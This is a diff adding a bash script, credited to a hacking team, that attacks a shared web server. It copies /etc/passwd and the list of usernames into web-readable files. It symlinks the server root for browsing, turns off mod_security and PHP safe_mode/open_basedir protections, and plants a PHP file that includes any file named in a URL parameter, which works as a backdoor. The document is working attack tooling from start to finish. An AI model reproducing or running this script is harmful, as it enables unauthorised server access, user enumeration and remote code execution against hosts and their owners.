@@ -1,0 +1,59 @@
+#! /bin/bash
+# bash Scripting
+# Programmed by Cloudx || {TIFA Team}
+# http://www.facebook.com/3mr.tifa
+# ===================================
+
+a=`cat /etc/passwd`
+b=`awk -F: '{ print $1 }' /etc/passwd | sort`
+if [[ "$a" != "" && "$b" != "" ]]
+then
+mkdir c
+ln -s / c/c.TXT
+echo "Options all
+DirectoryIndex Sux.html
+DirectoryIndex Sux.php
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+<IfModule mod_autoindex.c> 
+IndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble 
+</ifModule>
+<IfModule mod_security.c> 
+SecFilterEngine Off 
+SecFilterScanPOST Off 
+</IfModule>
+" > c/.htaccess
+echo "safe_mode = OFF 
+disable_functions = NONE 
+safe_mode_gid = OFF 
+open_basedir = OFF 
+register_globals = ON 
+exec = ON 
+shell_exec = ON" > c/php.ini
+echo "<?
+echo ini_get("safe_mode");
+echo ini_get("open_basedir");
+include($_GET["file"]);
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+echo ini_get("safe_mode");
+echo ini_get("open_basedir");
+include($_GET["ss"]);
+?>" > c/ini.php
+echo "$a" > c/passwd.txt
+echo "$b" > c/users.txt
+echo "==============================="
+echo "# Success :3"
+echo "# Go To c Folder for users"
+echo "# Go To c/c.TXT >> Server root link"
+echo "# Programmed by Cloudx || {TIFA Team}"
+echo "# http://www.facebook.com/3mr.tifa"
+echo "==============================="
+else
+echo "==============================="
+echo "# Fail To Excute"
+echo "# Programmed by Cloudx || {TIFA Team}"
+echo "# http://www.facebook.com/3mr.tifa"
+echo "==============================="
+fi
